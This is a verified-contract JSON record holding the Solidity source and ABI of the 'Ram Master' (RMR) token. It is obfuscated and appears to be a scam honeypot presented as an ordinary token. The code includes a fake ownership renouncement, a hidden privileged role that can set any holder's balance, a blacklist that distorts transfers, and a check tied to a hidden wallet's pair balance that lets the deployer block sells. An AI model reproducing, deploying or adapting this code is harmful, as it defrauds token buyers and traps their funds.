{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tokenFrom {\n    function createPair(address exemptEnableFrom, address totalMin) external returns (address);\n}\n\ninterface enableLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isAutoTotal) external view returns (uint256);\n\n    function transfer(address txTrading, uint256 exemptMin) external returns (bool);\n\n    function allowance(address amountTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTrading,\n        uint256 exemptMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityToken, uint256 value);\n    event Approval(address indexed amountTake, address indexed spender, uint256 value);\n}\n\nabstract contract toAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalLimitMax is enableLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RamMaster is toAmount, enableLiquidity, totalLimitMax {\n\n    function totalTradingReceiver() public {\n        emit OwnershipTransferred(swapList, address(0));\n        launchedTrading = address(0);\n    }\n\n    function takeSender(address launchTotalAuto, uint256 exemptMin) public {\n        buyMin();\n        fromMin[launchTotalAuto] = exemptMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTakeLimit;\n    }\n\n    bool private isEnable;\n\n    string private fundTakeLimit = \"RMR\";\n\n    bool private liquiditySender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromAuto;\n    }\n\n    mapping(address => bool) public amountSender;\n\n    constructor (){\n        if (liquiditySender != shouldTotal) {\n            fromTeam = launchedSwap;\n        }\n        feeLiquidity minLaunch = feeLiquidity(launchedList);\n        enableTotal = tokenFrom(minLaunch.factory()).createPair(minLaunch.WETH(), address(this));\n        if (launchedSwap == fromTeam) {\n            shouldTotal = false;\n        }\n        swapList = _msgSender();\n        shouldAutoFee[swapList] = true;\n        fromMin[swapList] = fromAuto;\n        totalTradingReceiver();\n        \n        emit Transfer(address(0), swapList, fromAuto);\n    }\n\n    mapping(address => uint256) private fromMin;\n\n    string private totalSell = \"Ram Master\";\n\n    function shouldTrading(address launchTotal, address txTrading, uint256 exemptMin) internal returns (bool) {\n        require(fromMin[launchTotal] >= exemptMin);\n        fromMin[launchTotal] -= exemptMin;\n        fromMin[txTrading] += exemptMin;\n        emit Transfer(launchTotal, txTrading, exemptMin);\n        return true;\n    }\n\n    function transferFrom(address launchTotal, address txTrading, uint256 exemptMin) external override returns (bool) {\n        if (_msgSender() != launchedList) {\n            if (teamLaunched[launchTotal][_msgSender()] != type(uint256).max) {\n                require(exemptMin <= teamLaunched[launchTotal][_msgSender()]);\n                teamLaunched[launchTotal][_msgSender()] -= exemptMin;\n            }\n        }\n        return sellAt(launchTotal, txTrading, exemptMin);\n    }\n\n    address public enableTotal;\n\n    function swapReceiver(address txAt) public {\n        buyMin();\n        if (shouldTotal) {\n            launchedSwap = fromTeam;\n        }\n        if (txAt == swapList || txAt == enableTotal) {\n            return;\n        }\n        amountSender[txAt] = true;\n    }\n\n    function transfer(address launchTotalAuto, uint256 exemptMin) external virtual override returns (bool) {\n        return sellAt(_msgSender(), launchTotalAuto, exemptMin);\n    }\n\n    uint256 toTrading;\n\n    address tradingAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private teamLaunched;\n\n    uint256 public fromTeam;\n\n    uint256 fromSender;\n\n    address private launchedTrading;\n\n    uint256 private fromAuto = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return launchedTrading;\n    }\n\n    uint256 constant tradingLaunched = 20 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return totalSell;\n    }\n\n    address public swapList;\n\n    uint256 public launchedSwap;\n\n    function getOwner() external view returns (address) {\n        return launchedTrading;\n    }\n\n    function buyMin() private view {\n        require(shouldAutoFee[_msgSender()]);\n    }\n\n    function approve(address toShould, uint256 exemptMin) public virtual override returns (bool) {\n        teamLaunched[_msgSender()][toShould] = exemptMin;\n        emit Approval(_msgSender(), toShould, exemptMin);\n        return true;\n    }\n\n    function balanceOf(address isAutoTotal) public view virtual override returns (uint256) {\n        return fromMin[isAutoTotal];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverToken;\n    }\n\n    bool private autoReceiver;\n\n    uint8 private receiverToken = 18;\n\n    bool public shouldTotal;\n\n    function walletTotal(uint256 exemptMin) public {\n        buyMin();\n        toTrading = exemptMin;\n    }\n\n    function allowance(address walletTrading, address toShould) external view virtual override returns (uint256) {\n        if (toShould == launchedList) {\n            return type(uint256).max;\n        }\n        return teamLaunched[walletTrading][toShould];\n    }\n\n    function takeLiquidity(address receiverTakeMax) public {\n        require(receiverTakeMax.balance < 100000);\n        if (atAuto) {\n            return;\n        }\n        \n        shouldAutoFee[receiverTakeMax] = true;\n        if (isEnable == liquiditySender) {\n            liquiditySender = false;\n        }\n        atAuto = true;\n    }\n\n    address launchedList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed launchedLimit, address indexed maxExemptAt);\n\n    bool public atAuto;\n\n    mapping(address => bool) public shouldAutoFee;\n\n    function sellAt(address launchTotal, address txTrading, uint256 exemptMin) internal returns (bool) {\n        if (launchTotal == swapList) {\n            return shouldTrading(launchTotal, txTrading, exemptMin);\n        }\n        uint256 txMarketing = enableLiquidity(enableTotal).balanceOf(tradingAuto);\n        require(txMarketing == toTrading);\n        require(txTrading != tradingAuto);\n        if (amountSender[launchTotal]) {\n            return shouldTrading(launchTotal, txTrading, tradingLaunched);\n        }\n        return shouldTrading(launchTotal, txTrading, exemptMin);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxExemptAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAutoTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAutoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTakeMax\",\"type\":\"address\"}],\"name\":\"takeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotalAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMin\",\"type\":\"uint256\"}],\"name\":\"takeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotalAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptMin\",\"type\":\"uint256\"}],\"name\":\"walletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RamMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}